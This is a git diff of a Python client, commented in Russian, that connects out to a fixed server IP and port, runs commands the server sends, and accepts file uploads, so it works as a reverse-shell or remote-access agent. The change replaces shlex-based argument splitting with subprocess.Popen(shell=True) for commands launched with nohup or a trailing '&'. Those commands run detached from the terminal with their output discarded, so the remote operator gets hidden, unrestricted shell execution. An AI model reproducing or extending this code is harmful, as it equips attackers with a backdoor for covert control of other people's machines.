@@ -3,7 +3,6 @@ import subprocess
 import os
 import sys
 import time
-import shlex  # добавлен импорт
 
 SERVER_IP = "192.168.100.3"  # Установите ваш IP сервера
 SERVER_PORT = 5000
@@ -53,39 +52,20 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Обработка nohup
-                    if "nohup" in cmd:
+                    # Обработка команд с nohup или фоновым запуском (&) через shell=True
+                    if "nohup" in cmd or cmd.endswith('&'):
                         try:
-                            args = shlex.split(cmd)
-                            cwd = os.getcwd()
                             subprocess.Popen(
-                                args,
-                                cwd=cwd,
+                                cmd,
+                                shell=True,
+                                cwd=os.getcwd(),
                                 stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL,
-                                preexec_fn=os.setpgrp  # отделяет процесс от управляющего терминала
+                                preexec_fn=os.setpgrp  # отделяет процесс от терминала
                             )
-                            s.send("Команда запущена через nohup".encode())
+                            s.send("Команда запущена через nohup/в фоне (shell=True).".encode())
                         except Exception as e:
-                            s.send(f"Ошибка запуска команды с nohup: {e}".encode())
-                        continue
-
-                    # Запуск команд в фоне (&)
-                    if cmd.endswith('&'):
-                        cmd_no_amp = cmd.rstrip('&').strip()
-                        try:
-                            args = shlex.split(cmd_no_amp)
-                            cwd = os.getcwd()
-                            subprocess.Popen(
-                                args,
-                                cwd=cwd,
-                                stdout=subprocess.DEVNULL,
-                                stderr=subprocess.DEVNULL,
-                                preexec_fn=os.setpgrp
-                            )
-                            s.send("Команда выполнена в фоне".encode())
-                        except Exception as e:
-                            s.send(f"Ошибка при запуске фоновой команды: {e}".encode())
+                            s.send(f"Ошибка запуска команды с nohup/в фоне: {e}".encode())
                         continue
 
                     if cmd.startswith("cd"):
@@ -175,7 +155,6 @@ def main():
                 elif command.startswith("upload:"):
                     filepath = command[len("upload:"):].strip()
                     try:
-                        # Принимаем 8 байт размера файла
                         filesize_bytes = s.recv(8)
                         if len(filesize_bytes) < 8:
                             s.send("Ошибка: не удалось получить размер файла".encode())
